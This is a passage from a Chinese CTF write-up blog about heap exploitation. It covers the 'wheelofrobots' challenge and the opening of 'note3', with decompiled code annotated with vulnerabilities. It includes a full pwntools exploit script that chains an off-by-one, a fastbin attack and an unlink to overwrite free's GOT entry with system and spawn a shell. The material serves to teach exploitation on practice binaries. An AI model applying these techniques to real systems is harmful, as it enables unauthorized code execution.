ru(<span class="string">"Increase Bender's intelligence: "</span>)</span><br><span class="line">        sl(str(size))</span><br><span class="line">    <span class="keyword">elif</span> index == <span class="number">3</span>:</span><br><span class="line">        ru(<span class="string">"Increase Robot Devil's cruelty: "</span>)</span><br><span class="line">        sl(str(size))</span><br><span class="line">    <span class="keyword">elif</span> index == <span class="number">6</span>:</span><br><span class="line">        ru(<span class="string">"Increase Destructor's powerful: "</span>)</span><br><span class="line">        sl(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Your choice :"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Your choice :"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Robot's name: "</span>)</span><br><span class="line">    sd(content)</span><br></pre></td></tr></table></figure>

<p>现在来看看漏洞点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">addd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _WORD *v0; <span class="comment">// rax</span></span><br><span class="line">  _WORD *v1; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ST08_4</span></span><br><span class="line">  _WORD *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400D83(<span class="string">"Which robot do you want to add to the wheel?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your choice :"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;choice_603110, <span class="number">0</span>, <span class="number">4u</span>LL);</span><br><span class="line">  choice = read_0(&amp;choice_603110, <span class="number">5u</span>LL);<span class="comment">//这里有offbyone的漏洞，定义是4个字节，这里溢出了一个字节，会使得0x603110的下一个地址处0x603114的内容被覆盖掉，这个地址正是2号机器人的使用标识，这里可以构造出机器人的伪使用，就是没有被使用却可以实现change（因为change也要看使用标志，1才能使用）</span></span><br><span class="line">  <span class="keyword">if</span> ( qword_603130 &lt;= <span class="number">2</span> ) <span class="comment">//这里说明最多申请3个堆块，603130存储个数</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !r1_603120 )  <span class="comment">//这是1号机器人的使用标志地址，为1表示使用，0表示未使用，0可申请</span></span><br><span class="line">        &#123;</span><br><span class="line">          buf = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">0x14</span>uLL);  <span class="comment">//calloc约等于malloc，两个参数，表示申请一个0x14大小的chunk块，buf存储chunk块的地址</span></span><br><span class="line">          r1_603120 = <span class="number">1</span>; </span><br><span class="line">          v0 = buf;</span><br><span class="line">          *buf = 'iT ynniT';</span><br><span class="line">          v0[<span class="number">4</span>] = <span class="string">'m'</span>;</span><br><span class="line">          ++qword_603130;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !r2_603114 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Increase Bender's intelligence: "</span>, <span class="number">5L</span>L);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">5u</span>LL);</span><br><span class="line">          v8 = read_0(&amp;s, <span class="number">5u</span>LL); <span class="comment">//v8是我们的size，存储在0x603138地址处，而我们的输入存储在0x6030F0中，下面的也类似上面两种的方法去分析，这里只对上界检查，我们可以输入负数实现整数溢出~也是一个洞这里。</span></span><br><span class="line">          <span class="keyword">if</span> ( v8 &gt; <span class="number">4</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Sorry impossible to make bender as smart!"</span>);</span><br><span class="line">            v8 = <span class="number">2</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          qword_6030F0 = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">20</span> * v8);</span><br><span class="line">          qword_603138 = v8;</span><br><span class="line">          r2_603114 = <span class="number">1</span>;</span><br><span class="line">          v1 = qword_6030F0;</span><br><span class="line">          *qword_6030F0 = 'dneB';</span><br><span class="line">          v1[2] = 're';</span><br><span class="line">          *(v1 + <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">          ++qword_603130;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !r3_603124 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Increase Robot Devil's cruelty: "</span>, <span class="number">5L</span>L);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">5u</span>LL);</span><br><span class="line">          <span class="built_in">size</span> = read_0(&amp;s, <span class="number">5u</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"You are crazy!!"</span>);</span><br><span class="line">            <span class="built_in">size</span> = <span class="number">20</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          qword_603100 = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">20</span> * <span class="built_in">size</span>);</span><br><span class="line">          qword_603140 = <span class="built_in">size</span>;</span><br><span class="line">          r3_603124 = <span class="number">1</span>;</span><br><span class="line">          v2 = qword_603100;</span><br><span class="line">          *qword_603100 = 'eD toboR';</span><br><span class="line">          v2[2] = 'liv';</span><br><span class="line">          ++qword_603130;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !r4_603118 )</span><br><span class="line">        &#123;</span><br><span class="line">          qword_6030E0 = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">0xFA0</span>uLL);</span><br><span class="line">          v3 = qword_6030E0;</span><br><span class="line">          *qword_6030E0 = 'mS niahC';</span><br><span class="line">          v3[2] = 'reko';</span><br><span class="line">          *(v3 + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">          r4_603118 = <span class="number">1</span>;</span><br><span class="line">          ++qword_603130;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !r5_603128 )</span><br><span class="line">        &#123;</span><br><span class="line">          qword_603108 = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">0x9C40</span>uLL);</span><br><span class="line">          v4 = qword_603108;</span><br><span class="line">          *qword_603108 = 'anoilliB';</span><br><span class="line">          v4[1] = 'toB eri';</span><br><span class="line">          r5_603128 = <span class="number">1</span>;</span><br><span class="line">          ++qword_603130;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !r6_60311C )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Increase Destructor's powerful: "</span>, <span class="number">5L</span>L);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">5u</span>LL);</span><br><span class="line">          v5 = read_0(&amp;s, <span class="number">5u</span>LL);</span><br><span class="line">          qword_6030E8 = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">20</span> * v5);</span><br><span class="line">          qword_603148 = v5;</span><br><span class="line">          r6_60311C = <span class="number">1</span>;</span><br><span class="line">          v6 = qword_6030E8;</span><br><span class="line">          *qword_6030E8 = 'tcurtseD';</span><br><span class="line">          v6[4] = 'ro';</span><br><span class="line">          *(v6 + <span class="number">10</span>) = <span class="number">0</span>;</span><br><span class="line">          ++qword_603130;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wheel Of Robots is Full!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是malloc里面发现的offbyone漏洞，继续看漏洞：</p>
<p><img src="/blog_img/1563862106224.png" alt="1563862106224"></p>
<p>这里是free函数，由于都是一样的，就分析一个即可，触类旁通，这里先看下是否可以用，为1表示可以使用，可以free掉，这里有UAF漏洞，使用后没有清空内容的空间，但是puts函数貌似没有，就比较难受，泄露真实地址很难利用。</p>
<p>再看change:</p>
<p><img src="/blog_img/1563862401930.png" alt="1563862401930"></p>
<h5 id="这里可以看到是先判断是否可以使用，看标志位，然后再输入名字，去调用，其实名字就是我们的content，这里如果是固定大小的堆块是很难改的，但是有利用前面的堆块做文章的题，看到2号堆块是从0x603138处取出自己的输入的大小-20作为改变content的大小，看似是同一个地方取出来，好像都是一样的，但是如果我们通过中途修改了呢，那再次编辑时就可以实现比原来的大小要大，从而实现溢出，从而实现堆溢出伪造fake-chunk，unlink攻击，任意地址写漏洞，从而泄露出真实地址从而getshell"><a href="#这里可以看到是先判断是否可以使用，看标志位，然后再输入名字，去调用，其实名字就是我们的content，这里如果是固定大小的堆块是很难改的，但是有利用前面的堆块做文章的题，看到2号堆块是从0x603138处取出自己的输入的大小-20作为改变content的大小，看似是同一个地方取出来，好像都是一样的，但是如果我们通过中途修改了呢，那再次编辑时就可以实现比原来的大小要大，从而实现溢出，从而实现堆溢出伪造fake-chunk，unlink攻击，任意地址写漏洞，从而泄露出真实地址从而getshell" class="headerlink" title="这里可以看到是先判断是否可以使用，看标志位，然后再输入名字，去调用，其实名字就是我们的content，这里如果是固定大小的堆块是很难改的，但是有利用前面的堆块做文章的题，看到2号堆块是从0x603138处取出自己的输入的大小*20作为改变content的大小，看似是同一个地方取出来，好像都是一样的，但是如果我们通过中途修改了呢，那再次编辑时就可以实现比原来的大小要大，从而实现溢出，从而实现堆溢出伪造fake_chunk，unlink攻击，任意地址写漏洞，从而泄露出真实地址从而getshell~"></a>这里可以看到是先判断是否可以使用，看标志位，然后再输入名字，去调用，其实名字就是我们的content，这里如果是固定大小的堆块是很难改的，但是有利用前面的堆块做文章的题，看到2号堆块是从0x603138处取出自己的输入的大小*20作为改变content的大小，看似是同一个地方取出来，好像都是一样的，但是如果我们通过中途修改了呢，那再次编辑时就可以实现比原来的大小要大，从而实现溢出，从而实现堆溢出伪造fake_chunk，unlink攻击，任意地址写漏洞，从而泄露出真实地址从而getshell~</h5><h5 id="现在开始实现刚刚的所有漏洞利用，这里主要通过两种方式：offbyone-fastbin-attack-unlink"><a href="#现在开始实现刚刚的所有漏洞利用，这里主要通过两种方式：offbyone-fastbin-attack-unlink" class="headerlink" title="现在开始实现刚刚的所有漏洞利用，这里主要通过两种方式：offbyone+fastbin_attack+unlink"></a>现在开始实现刚刚的所有漏洞利用，这里主要通过两种方式：offbyone+fastbin_attack+unlink</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./wheelofrobots'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./wheelofrobots'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offbyone</span><span class="params">(inuse)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Your choice :"</span>)</span><br><span class="line">    sd(<span class="string">'7777'</span> + inuse)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(index,size)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Your choice :'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">2</span>:</span><br><span class="line">        ru(<span class="string">"Increase Bender's intelligence: "</span>)</span><br><span class="line">        sl(str(size))</span><br><span class="line">    <span class="keyword">elif</span> index == <span class="number">3</span>:</span><br><span class="line">        ru(<span class="string">"Increase Robot Devil's cruelty: "</span>)</span><br><span class="line">        sl(str(size))</span><br><span class="line">    <span class="keyword">elif</span> index == <span class="number">6</span>:</span><br><span class="line">        ru(<span class="string">"Increase Destructor's powerful: "</span>)</span><br><span class="line">        sl(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Your choice :"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice : "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Your choice :"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Robot's name: "</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="comment">#bk(0x0000000000400E19)</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">1</span>)    <span class="comment">#构造出fastbin堆块，</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">offbyone(<span class="string">'\x01'</span>)    <span class="comment">#offbyone攻击，改标志值为1，实现free状态下的修改，那么就可构造出fastbin_attack的一个fake_chunk(0x603138)</span></span><br><span class="line">change(<span class="number">2</span>,p64(<span class="number">0x603138</span>)) <span class="comment">#分布：chunk2---&gt;0x603138--&gt;0x0</span></span><br><span class="line">offbyone(<span class="string">'\x00'</span>)  <span class="comment">#还原回装态</span></span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x20</span>)<span class="comment">#0x20会被写到0x603140的位置作为fake_chunk的地址</span></span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">1</span>)<span class="comment">#得到fake_chunk</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">malloc(<span class="number">6</span>,<span class="number">7</span>) <span class="comment">#构造出unlink需要的块大小（大于fastbin的范围）</span></span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">7</span>)  <span class="comment">#同上</span></span><br><span class="line">change(<span class="number">1</span>,p64(<span class="number">1000</span>)) <span class="comment">#这里会将1000写入到0x603148处（chunk6的read的大小，为实现泄堆溢出），实现fastbin的attack</span></span><br><span class="line">ptr = <span class="number">0x6030E8</span><span class="comment">#chunk8   D8 E0 4 E8 6 F0 2 F8 1</span></span><br><span class="line">FD = ptr - <span class="number">0x18</span> </span><br><span class="line">BK = ptr - <span class="number">0x10</span></span><br><span class="line">py = <span class="string">''</span>  <span class="comment">#这里gdb调试才知道6和3的块大小为0xa0</span></span><br><span class="line">py += p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">py += p64(FD) + p64(BK)</span><br><span class="line">py = py.ljust(<span class="number">0x90</span>,<span class="string">'a'</span>)</span><br><span class="line">py += p64(<span class="number">0x90</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">change(<span class="number">6</span>,py)</span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#unlink成功</span></span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'AAAAAAAA'</span>*<span class="number">3</span> +p64(free_got) + p64(atoi_got)<span class="comment">#往chunk2写入atoi的got</span></span><br><span class="line">change(<span class="number">6</span>,py)</span><br><span class="line">change(<span class="number">6</span>,p64(puts_plt))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">atoi_addr = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"atoi_addr---&gt;"</span> + hex(atoi_addr)</span><br><span class="line">system = atoi_addr - libc.symbols[<span class="string">"atoi"</span>] + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="comment">#onegadget = atoi_addr - libc.symbols["atoi"] + 0x4526a</span></span><br><span class="line">change(<span class="number">6</span>,p64(system))</span><br><span class="line">change(<span class="number">1</span>,<span class="string">"/bin/sh"</span>) <span class="comment">#往chunk1写入binsh即可getshell，这里onegadget用不了~</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>看下调试过程：</p>
<p><img src="/blog_img/1563872810067.png" alt="1563872810067"></p>
<p>这是成功构造的fastbin_attack</p>
<p><img src="/blog_img/1563872936098.png" alt="1563872936098"></p>
<p>改写0x603148处的大小</p>
<p><img src="/blog_img/1563873003413.png" alt="1563873003413"></p>
<p>这是我们的unlink的构造</p>
<p><img src="/blog_img/1563873092428.png" alt="1563873092428"></p>
<p>这是我们unlink后的写入可见往chunk2写入了atoi的got表，本身则是free的got</p>
<p><img src="/blog_img/1563873247133.png" alt="1563873247133"></p>
<p>成功改写free的got为system地址~即可getshell</p>
<p><img src="/blog_img/1563873287755.png" alt="1563873287755"></p>
<p>这题学到了新姿势，通过offbyone漏洞去改写状态，从而实现fastbin的attack，然后利用fastbin的attack实现了改写read大小，从而实现堆溢出，构造出unlink，从而实现泄露真实地址从而getshell~</p>
<p>下面是收官之题，有关unlink的最后一题：</p>
<h4 id="note3"><a href="#note3" class="headerlink" title="note3"></a>note3</h4><p><img src="/blog_img/1563894961561.png" alt="1563894961561"></p>
<p>很好，保护机制只开了canary和NX，问题不大</p>
<p>接着ida分析一波：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdin, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(stdout, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(stderr, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( sub_400A1B(<span class="number">60L</span>L, <span class="number">0L</span>L) )</span><br><span class="line">    &#123;</span><br><span class="line">      case <span class="number">1</span>u:</span><br><span class="line">        malloc_0();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="number">2</span>u:</span><br><span class="line">        puts_0();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="number">3</span>u:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="number">4</span>u:</span><br><span class="line">        free_0();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      case <span class="number">5</span>u:</span><br><span class="line">        puts(<span class="string">"Bye~"</span>);</span><br><span class="line">        exit(<span class="number">0</span>);</span><br><span class="line">        <span 